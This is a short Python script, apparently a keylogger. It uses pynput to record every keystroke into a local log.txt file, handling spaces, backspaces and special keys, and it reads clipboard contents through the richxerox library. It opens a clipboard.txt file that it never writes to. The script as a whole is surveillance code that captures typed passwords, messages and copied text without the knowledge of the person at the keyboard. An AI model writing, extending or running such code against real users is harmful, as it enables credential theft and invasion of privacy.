from pynput import keyboard
from richxerox import *
import os

log_file = open("log.txt", "w")
clipboard_file = open("clipboard.txt", "w")

def on_press(key):
    try:
        if key == keyboard.Key.space:
            log_file.write(" ")
        elif key == keyboard.Key.backspace:
            log_file.seek(0, os.SEEK_END) # Move the cursor to the end of the file
            pos = log_file.tell() # Get the current position of the cursor
            if pos > 0:
                log_file.seek(pos - 1)
                log_file.truncate() # Delete the last character
        elif key == keyboard.Key.esc:
            pass
        else:
            log_file.write(key.char)
    except AttributeError:
        log_file.write("[" + str(key) + "]")
        
def on_release(key):
    if key == keyboard.Key.esc:
        return False
    
listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()


text = paste(format = "text")
print(f'"text": {text}')
    